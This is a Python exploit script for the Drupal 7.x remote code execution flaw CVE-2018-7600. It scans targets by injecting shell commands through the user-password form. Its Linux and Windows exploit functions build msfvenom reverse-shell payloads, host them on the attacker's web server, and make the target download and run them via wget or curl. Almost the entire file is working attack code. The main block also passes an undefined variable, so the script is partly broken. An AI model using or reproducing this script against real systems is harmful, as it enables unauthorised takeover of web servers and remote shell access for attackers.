#!/usr/bin/env python3

import requests
import argparse
from bs4 import BeautifulSoup
import os
import sys
import urllib
from os import system, name



#############################################################################################################

def test_target(target):
  command = "echo 'haha'"
  requests.packages.urllib3.disable_warnings()
  get_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#type]':'markup', 'name[#markup]': command}
  post_params = {'form_id':'user_pass', '_triggering_element_name':'name', '_triggering_element_value':'', 'opz':'E-mail new Password'}
  r = requests.post(target, params=get_params, data=post_params)
  soup = BeautifulSoup(r.text, "html.parser")
  try:
    form = soup.find('form', {'id': 'user-pass'})
    form_build_id = form.find('input', {'name': 'form_build_id'}).get('value')
    if form_build_id:
        get_params = {'q':'file/ajax/name/#value/' + form_build_id}
        post_params = {'form_build_id':form_build_id}
        r = requests.post(target, params=get_params, data=post_params)
        parsed_result = r.text.split('[{"command":"settings"')[0]
        if "haha" in parsed_result:
            print ("[!] The target is vulnerable")
        else:
            print ("[*] - Target not vulnerable")
  except:
    print("ERROR: Something went wrong.")
    raise

#############################################################################################################

def exploit_linux(target, lhost, lport, payl):
  #generating a payload with the help of msfvenom
  os.system("msfvenom -p linux/x64/shell_reverse_tcp LHOST=%s LPORT=%s -f elf -o /var/www/html/%s.elf"%(lhost,lport,payl))
  def clear(): _ = system('clear')
  clear()
  #checking if the payload got generated and exists in the directory
  if os.path.isfile('/var/www/html/%s.elf'%(payl)): print ("Payload Successfuly Generated")
  else: print("Failed to create payload, check if you have metasploit")
  #starting apache to host our payload
  os.system("sudo /etc/init.d/apache2 start")
  #uploading payload
  command = "wget http://%s/%s.elf"%(lhost,payl)
  requests.packages.urllib3.disable_warnings()
  get_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#type]':'markup', 'name[#markup]': command}
  post_params = {'form_id':'user_pass', '_triggering_element_name':'name', '_triggering_element_value':'', 'opz':'E-mail new Password'}
  r = requests.post(target, params=get_params, data=post_params, verify=False)
  soup = BeautifulSoup(r.text, "html.parser")
  try:
    form = soup.find('form', {'id': 'user-pass'})
    form_build_id = form.find('input', {'name': 'form_build_id'}).get('value')
    if form_build_id:
        get_params = {'q':'file/ajax/name/#value/' + form_build_id}
        post_params = {'form_build_id':form_build_id}
        r = requests.post(target, params=get_params, data=post_params, verify=False)
        parsed_result = r.text.split('[{"command":"settings"')[0]
        print(parsed_result)
  except:
    print("ERROR: Something went wrong.")
    raise
  command = "chmod 777 %s.elf"%(payl)
  requests.packages.urllib3.disable_warnings()
  get_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#type]':'markup', 'name[#markup]': command}
  post_params = {'form_id':'user_pass', '_triggering_element_name':'name', '_triggering_element_value':'', 'opz':'E-mail new Password'}
  r = requests.post(target, params=get_params, data=post_params, verify=False)
  soup = BeautifulSoup(r.text, "html.parser")
  try:
    form = soup.find('form', {'id': 'user-pass'})
    form_build_id = form.find('input', {'name': 'form_build_id'}).get('value')
    if form_build_id:
        get_params = {'q':'file/ajax/name/#value/' + form_build_id}
        post_params = {'form_build_id':form_build_id}
        r = requests.post(target, params=get_params, data=post_params, verify=False)
        parsed_result = r.text.split('[{"command":"settings"')[0]
        print(parsed_result)
  except:
    print("ERROR: Something went wrong.")
    raise
  os.system("rm /var/www/html/%s.elf"%(payl))
  #execution
  command = "./%s.elf"%(payl)
  requests.packages.urllib3.disable_warnings()
  get_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#type]':'markup', 'name[#markup]': command}
  post_params = {'form_id':'user_pass', '_triggering_element_name':'name', '_triggering_element_value':'', 'opz':'E-mail new Password'}
  r = requests.post(target, params=get_params, data=post_params, verify=False)
  soup = BeautifulSoup(r.text, "html.parser")
  try:
    form = soup.find('form', {'id': 'user-pass'})
    form_build_id = form.find('input', {'name': 'form_build_id'}).get('value')
    if form_build_id:
        get_params = {'q':'file/ajax/name/#value/' + form_build_id}
        post_params = {'form_build_id':form_build_id}
        print("check listener")
        r = requests.post(target, params=get_params, data=post_params, verify=False)
        parsed_result = r.text.split('[{"command":"settings"')[0]
        print(parsed_result)

  except:
    print("ERROR: Something went wrong.")
    raise

#############################################################################################################
def exploit_windows(target, lhost, lport, payl):
  #generating a payload with the help of msfvenom
  os.system("msfvenom -p windows/shell_reverse_tcp LHOST=%s LPORT=%s -f exe -o /var/www/html/%s.exe"%(lhost,lport,payl))
  def clear(): _ = system('clear')
  clear()
  #checking if the payload got generated and exists in the directory
  if os.path.isfile('/var/www/html/%s.exe'%(payl)): print ("Payload Successfuly Generated")
  else: print("Failed to create payload, check if you have metasploit")
  #starting apache to host our payload
  os.system("sudo /etc/init.d/apache2 start")
  #uploading payload
  command = "curl -o C:\Users\Public\Downloads\%s.exe http://%s/%s.exe"%(payl,lhost,payl)
  requests.packages.urllib3.disable_warnings()
  get_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#type]':'markup', 'name[#markup]': command}
  post_params = {'form_id':'user_pass', '_triggering_element_name':'name', '_triggering_element_value':'', 'opz':'E-mail new Password'}
  r = requests.post(target, params=get_params, data=post_params, verify=False)
  soup = BeautifulSoup(r.text, "html.parser")
  try:
    form = soup.find('form', {'id': 'user-pass'})
    form_build_id = form.find('input', {'name': 'form_build_id'}).get('value')
    if form_build_id:
        get_params = {'q':'file/ajax/name/#value/' + form_build_id}
        post_params = {'form_build_id':form_build_id}
        r = requests.post(target, params=get_params, data=post_params, verify=False)
        parsed_result = r.text.split('[{"command":"settings"')[0]
        print(parsed_result)
  except:
    print("ERROR: Something went wrong.")
    raise
  os.system("rm /var/www/html/%s.exe"%(payl))
  #executing payload
  command = "C:\Users\Public\Downloads\%s.exe"%(payl)
  requests.packages.urllib3.disable_warnings()
  get_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#type]':'markup', 'name[#markup]': command}
  post_params = {'form_id':'user_pass', '_triggering_element_name':'name', '_triggering_element_value':'', 'opz':'E-mail new Password'}
  r = requests.post(target, params=get_params, data=post_params, verify=False)
  soup = BeautifulSoup(r.text, "html.parser")
  try:
    form = soup.find('form', {'id': 'user-pass'})
    form_build_id = form.find('input', {'name': 'form_build_id'}).get('value')
    if form_build_id:
        get_params = {'q':'file/ajax/name/#value/' + form_build_id}
        post_params = {'form_build_id':form_build_id}
        print("check listener")
        r = requests.post(target, params=get_params, data=post_params, verify=False)
        parsed_result = r.text.split('[{"command":"settings"')[0]

  except:
    print("ERROR: Something went wrong.")
    raise


#############################################################################################################

#print ('welcome to the automation script for the 7.x Drupal CVE-2018-7600')
payl ="calc"
if len(sys.argv) > 2:
   if sys.argv[2] == "scan" :
      test_target(sys.argv[1])
      sys.exit()
elif len(sys.argv) < 2 :
      print ("\nUsage: " + sys.argv[0] + " <Target> <lhost> <lport> <os> exploit or "+sys.argv[0]+" <Target> scan\n")
      sys.exit()

if len(sys.argv) < 5:
    print ("\nUsage: " + sys.argv[0] + " <Target> <lhost> <lport> <os> exploit or "+sys.argv[0]+" <Target> scan\n")
    sys.exit()

elif sys.argv[5] == "exploit" :
    if(sys.argv[4] == "linux"):
      exploit_linux(sys.argv[1],sys.argv[2],sys.argv[3],calc)
    elif(sys.argv[4] == "windows"):
      exploit_windows(sys.argv[1],sys.argv[2],sys.argv[3],calc)

else : print("check if you spelled your everything correctly")
